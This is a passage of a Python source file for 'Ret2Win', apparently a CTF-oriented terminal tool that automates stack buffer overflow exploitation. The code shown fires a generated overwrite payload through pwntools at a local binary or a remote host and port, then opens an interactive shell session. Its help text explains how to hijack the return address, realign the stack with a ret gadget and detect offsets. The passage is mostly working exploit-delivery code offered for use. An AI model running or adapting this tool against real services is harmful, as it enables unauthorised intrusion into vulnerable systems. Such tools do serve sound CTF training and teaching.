        console.print(f"Offset:       [bold yellow]{self.offset} bytes[/bold yellow]")
        console.print(f"Delivery:     [bold cyan]{self.input_mode}[/bold cyan]")
        console.print()

        if not Confirm.ask("[bold red]Fire exploit now?[/bold red]", default=True):
            self.set_status("Exploit cancelled by user.", "yellow")
            return

        # argv[] entries are NUL-terminated C strings, so a payload with an
        # embedded null byte before its final byte can never be delivered
        # whole via argv -- a kernel/execve limitation, not something this
        # tool can route around. Most 64-bit addresses pack with trailing
        # 0x00 bytes, so this is common rather than an edge case; catch it
        # with a clear message instead of a raw pwntools exception below.
        if self.target_mode == "local" and self.input_mode == "argv" and b"\x00" in payload[:-1]:
            console.print(
                "\n[bold red][!] This payload contains a null byte before its "
                "final byte, so it cannot be passed whole as an argv[] "
                "argument (argv strings are NUL-terminated). Switch delivery "
                "to stdin (if supported by the target) or pick a win "
                "address/gadget without embedded null bytes.[/bold red]"
            )
            Prompt.ask("[dim]Press Enter to return to Ret2Win TUI...[/dim]", default="")
            self.set_status("Exploit aborted: argv payload contains null bytes.", "bold red")
            return

        console.print("\n" + "=" * 65)
        console.print(f"[+] Ret2Win: Launching exploit against {dest_desc}...")
        console.print(f"[+] Sending payload ({len(payload)} bytes)...")
        console.print("=" * 65 + "\n")

        try:
            from pwn import process as pwn_process, remote as pwn_remote
            if self.target_mode == "remote":
                io = pwn_remote(self.remote_host, int(self.remote_port))
                io.sendline(payload)
                io.interactive()
            else:
                if self.input_mode == "argv":
                    io = pwn_process([self.binary_path, payload])
                else:
                    io = pwn_process(self.binary_path)
                    io.sendline(payload)
                io.interactive()
        except Exception as e:
            console.print(f"\n[bold red][!] Execution error: {e}[/bold red]")

        console.print("\n" + "=" * 65)
        console.print("[*] Session complete.")
        Prompt.ask("[dim]Press Enter to return to Ret2Win TUI...[/dim]", default="")
        self.set_status("Returned from exploit execution session.", "bold green")

    def action_run_solve_script(self):
        """Execute solve.py interactively."""
        if not os.path.isfile("solve.py"):
            self.set_status("solve.py not found. Generate it first via [s].", "bold red")
            return

        console.print("\n" + "=" * 65)
        console.print("[+] Running solve.py via Python...")
        console.print("=" * 65 + "\n")
        try:
            subprocess.run([sys.executable, "solve.py"], check=False)
        except Exception as e:
            console.print(f"\n[!] Execution error: {e}")
        console.print("\n" + "=" * 65)
        console.print("[*] Script execution complete.")
        Prompt.ask("[dim]Press Enter to return to Ret2Win TUI...[/dim]", default="")
        self.set_status("Returned from solve.py execution session.", "bold green")

    def action_show_help(self):
        """Displays help, Ret2Win concepts, and CTF guide."""
        console.print()
        console.print(Rule("[bold cyan]📖 Ret2Win Exploitation & CTF Guide[/bold cyan]"))
        console.print()

        guide_content = """
[bold bright_cyan]What is Ret2Win?[/bold bright_cyan]
Ret2Win (Return-to-Win) is a classic binary exploitation pattern where a vulnerable
program allows overflowing a stack buffer to overwrite the saved instruction pointer
(EIP on x86, RIP on x86_64) with the address of an existing target function
(such as `win()`, `print_flag()`, or `give_shell()`).

[bold bright_cyan]x86_64 Stack Alignment (16-byte boundary):[/bold bright_cyan]
In 64-bit Linux (System V AMD64 ABI), functions like `printf` or `system` in glibc
use SIMD instructions (such as `movaps`) that require the stack pointer (RSP)
to be 16-byte aligned before calling a function. If your payload crashes inside
glibc, prepend a lone `ret` gadget address before `win()` to realign RSP by 8 bytes.

[bold bright_cyan]Offset Auto-Detection & Non-Canonical RIP:[/bold bright_cyan]
On x86_64, popping a non-canonical address triggers a General Protection Fault (#GP)
before RIP is updated, leaving RIP at the `ret` opcode. Ret2Win inspects `fault_addr`
and stack memory to reliably calculate the exact byte offset on both 32 and 64-bit binaries.

[bold bright_cyan]Delivery Channels:[/bold bright_cyan]
• [bold yellow]stdin[/bold yellow] : Sends payload through standard input (`gets`, `scanf`, `read`, `fgets`).
• [bold yellow]argv[1][/bold yellow]: Launches binary with payload as first command-line argument (`strcpy(buf, argv[1])`).

[bold bright_cyan]Shortcuts & Navigation:[/bold bright_cyan]
Type any menu number [1-9], letter [s, g, f, r, h, q], or command name at the prompt!
"""
        console.print(Panel(guide_content, border_style="cyan"))
        Prompt.ask("\n[dim]Press Enter to return to main dashboard...[/dim]", default="")

    def run(self):
        """Main interactive application loop.

        The banner/panels/menu dashboard is printed once here at the start,
        not re-rendered on every loop iteration: it's meant to be a static
        header, with everything below it (prompts, action output, status
        updates) behaving like a normal scrolling CLI session rather than a
        full-screen redraw on every command. Type [m] any time to print the
        dashboard again if it's scrolled out of view.
        """
        self.clear_screen()
        self.render_dashboard()

        # This loop's prompt is always the very first prompt read anywhere
        # in the process (nothing else runs before the user's first command
        # is dispatched), which makes it the one call site affected by the
        # readline first-redisplay quirk explained in _first_prompt(). Every
        # later prompt -- including this same one on the 2nd+ iteration --
        # is unaffected, so only the first iteration needs the workaround.
        first_prompt = True
        while True:
            try:
                if first_prompt:
                    cmd = _first_prompt("[bold bright_cyan]ret2win[/bold bright_cyan] [dim]➜[/dim]: ").strip().lower()
                    first_prompt = False
                else:
                    cmd = Prompt.ask("[bold bright_cyan]ret2win[/bold bright_cyan] [dim]➜[/dim]").strip().lower()
            except (KeyboardInterrupt, EOFError):
                console.print("\n[dim]Exiting Ret2Win. Happy hacking![/dim]")
                break

            if cmd in ("q", "quit", "exit"):
                console.print("\n[bold green]Exiting Ret2Win. Happy hacking -Casper![/bold green]")
                break
            elif cmd in ("1", "binary", "bin", "select"):
                self.action_select_binary()
            elif cmd in ("2", "detect", "auto", "offset"):
                self.action_detect_offset()
            elif cmd in ("3", "validate", "verify"):
                self.action_validate_offset()
            elif cmd in ("4", "win", "target"):
                self.action_set_win_addr()
            elif cmd in ("5", "align", "alignment"):
                self.action_toggle_align()
            elif cmd in ("6", "input", "argv", "stdin"):
                self.action_toggle_input_mode()
            elif cmd in ("7", "dest", "destination", "remote", "local"):
                self.action_set_destination()
            elif cmd in ("8", "inspect", "hexdump", "payload"):
                self.action_inspect_payload()
            elif cmd in ("9", "symbols", "sym"):
                self.action_browse_symbols()
            elif cmd in ("s", "solve", "script"):
                self.action_solve_script()
            elif cmd in ("g", "generate", "gen"):
                self.action_generate_payload()
            elif cmd in ("f", "fire", "exploit", "pwn"):
                self.action_fire_exploit()
            elif cmd in ("r", "run"):
                self.action_run_solve_script()
            elif cmd in ("h", "help", "?"):
                self.action_show_help()
            elif cmd in ("m", "menu", "dashboard"):
                self.render_dashboard()
                continue
            elif cmd == "":
                continue
            else:
                self.set_status(f"Unknown action '{cmd}'. Type [h] for help, [m] for the menu, or select 1-9, s, g, f, q.", "yellow")

            # Print a short status line after each action instead of
            # redrawing the whole dashboard, so the session scrolls like an
            # ordinary CLI tool rather than clearing/repainting every time.
            console.print(f" [dim]Status:[/dim] [{self.last_status_style}]{self.last_status_msg}[/{self.last_status_style}]")


def launch_tui(
    binary: Optional[str] = None,
    win_addr: Optional[str] = None,
    offset: Optional[int] = None,
    align: bool = False,
    ret_gadget: Optional[str] = None,
    input_mode: str = "stdin",
    remote_host: Optional[str] = None,
    remote_port: Optional[str] = None
):
    """Launch the Ret2Win Rich Terminal User Interface."""
    tui_app = RichRet2WinTUI(
        binary=binary,
        win_addr=win_addr,
        offset=offset,
        align=align,
        ret_gadget=ret_gadget,
        input_mode=input_mode,
        remote_host=remote_host,
        remote_port=remote_port
    )
    tui_app.run()


if __name__ == "__main__":
    initial_bin = sys.argv[1] if len(sys.argv) > 1 else None
    launch_tui(binary=initial_bin)
